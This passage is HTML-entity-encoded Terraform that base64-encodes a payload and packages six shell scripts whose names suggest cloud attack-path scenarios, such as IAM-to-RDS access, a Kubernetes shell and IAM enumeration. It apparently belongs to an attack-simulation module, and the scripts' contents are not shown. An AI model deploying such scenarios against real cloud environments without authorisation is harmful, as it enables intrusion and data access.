local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;instance2rds&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;instance2rds&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;iam2rds&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;iam2rds&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;scan2kubeshell&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;scan2kubeshell&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;kube2s3&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;kube2s3&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;gcpiam2cloudsql&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;gcpiam2cloudsql&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;iam2enum&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;iam2enum&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre> |